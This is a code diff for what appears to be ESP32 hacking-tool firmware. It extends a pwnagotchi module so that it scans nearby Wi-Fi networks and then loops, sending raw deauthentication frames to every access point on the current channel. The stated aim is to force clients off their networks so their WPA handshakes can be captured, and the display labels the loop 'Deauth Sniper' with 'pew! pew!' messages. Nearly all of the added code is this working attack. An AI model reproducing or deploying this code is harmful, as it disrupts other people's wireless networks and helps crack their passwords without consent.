@@ -11,6 +11,8 @@ Thanks to @bmorcelli for his help doing a better code.
 #include "core/mykeyboard.h"
 #include "ui.h"
 #include "spam.h"
+#include "../wifi/sniffer.h"
+#include "../wifi/wifi_atks.h"
 
 #define STATE_INIT 0
 #define STATE_WAKE 1
@@ -43,10 +45,13 @@ void pwnagotchi_update() {
 
     if (state == STATE_WAKE) {
       checkPwngridGoneFriends();
-      advertise(current_channel++);
+      current_channel++; // Sniffer ch variable
       if (current_channel == 15) {
         current_channel = 1;
       }
+      ch=current_channel;
+      advertise(current_channel);
+      
     }
     updateUi(true);
 }
@@ -95,10 +100,62 @@ void pwnagotchi_start() {
   // Draw footer & header
   drawTopCanvas();
   drawBottomCanvas();
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default)); // prepares the Deauth frame
 
+  bool pwgrid_done=false;
+  bool Handshake_done=false;
+  _only_HS=true; // Pwnagochi only looks for handshakes
+  drawMood("(^>_<^)","Scanning networks..");
+  
+  int nets;
+  WiFi.mode(WIFI_STA);
+  registeredBeacons.clear();
+  nets=WiFi.scanNetworks();
+  for(int i=0; i<nets; i++){
+    BeaconList beacon;
+    beacon.channel=(uint8_t)WiFi.channel(i);
+    memcpy(beacon.MAC,WiFi.BSSID(i),6);
+    registeredBeacons.insert(beacon);
+  }
+
+  #if defined(HAS_TOUCH)
+    TouchFooter();
+  #endif
+  pwnagotchi_update();
+  bool shot=false;
   while(true) {
-    if(millis()-tmp>3000) {
+    if(millis()-tmp<2000 && !Handshake_done)  {
+      Handshake_done=true;
+      drawMood("(-@_@)","Preparing Deauth Sniper");
+      WiFi.mode(WIFI_AP);
+    }
+    if(millis()-tmp>2000 && Handshake_done && !pwgrid_done) {
+      for(auto registeredBeacon:registeredBeacons) {
+        Serial.println(String(registeredBeacon.MAC,HEX) + " on ch" + String(registeredBeacon.channel) + " -> desired ch " + String(ch));
+        if(registeredBeacon.channel==ch) {
+          memcpy(&ap_record.bssid,registeredBeacon.MAC, 6);
+          wsl_bypasser_send_raw_frame(&ap_record,registeredBeacon.channel); //writes the buffer with the information
+          send_raw_frame(deauth_frame,26);
+        }
+      }
+      drawMood(shot?"(<<_<<)":"(>>_>>)",shot?"Lasers Activated! Deauthing":"pew! pew! pew!");
+      delay(500);
+      shot=!shot;
+    }
+    if(millis()-tmp>12000 && pwgrid_done==false){
+      WiFi.mode(WIFI_STA);
+      drawMood("(^__^)","Lets Make Friends!");
+      pwgrid_done=true;
+    }
+    if(pwgrid_done) {
+      delay(3000);
+      advertise(ch);
+      updateUi(true);
+    }
+    if(millis()-tmp>29500) {
       tmp=millis();
+      pwgrid_done=false;
+      Handshake_done=false;
       pwnagotchi_update();
     }
     if (checkSelPress()) {
